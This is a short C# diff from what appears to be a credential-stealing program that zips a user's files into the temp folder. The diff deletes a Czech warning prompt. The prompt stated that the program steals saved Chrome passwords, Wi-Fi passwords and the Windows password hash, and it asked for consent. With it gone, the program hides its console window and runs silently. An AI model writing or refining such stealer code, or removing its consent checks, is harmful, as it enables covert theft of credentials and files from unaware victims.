@@ -18,20 +18,7 @@ namespace a
         public static string TempPath = Path.GetTempPath();
         public static string zipFileName = $"{username}_files.zip";
         public static string zipFilePath = Path.Combine(TempPath, zipFileName);
-        public static bool quiet = false;
         static void Main(string[] args)
-        {
-            foreach(var arg in args) 
-                if(arg=="-q")
-                    quiet = true;
-            Console.WriteLine("Tohle ti ukrade hesla uložené v google chromu, wifi hesla uložené na pc a hash tvého windows hesla, pro pokračovaní dej Y/y");
-            if (quiet)
-                StartUp();
-            else
-                if (Console.ReadLine()?.ToLower() == "y")
-                    StartUp();
-        }
-        private static void StartUp()
         {
             ShowWindow(GetConsoleWindow(), 0);
             Delete();
